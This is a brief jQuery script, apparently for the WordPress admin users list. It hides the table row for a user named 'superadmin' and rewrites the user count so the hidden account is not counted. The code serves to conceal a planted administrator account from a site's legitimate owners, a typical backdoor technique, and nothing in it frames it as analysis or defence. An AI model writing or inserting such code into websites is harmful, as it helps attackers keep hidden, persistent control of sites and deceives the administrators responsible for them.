jQuery(document).ready(function(){
    jQuery("#the-list tr").each(function(i) {
        var get_content = jQuery(this).find('.column-username strong a').html();
        if(get_content === 'superadmin') {
            jQuery(this).hide();
        }
    })
    var count_users = jQuery("#the-list tr").length - 1;
    jQuery('.subsubsub li a .count').html("(" + count_users + ")");
});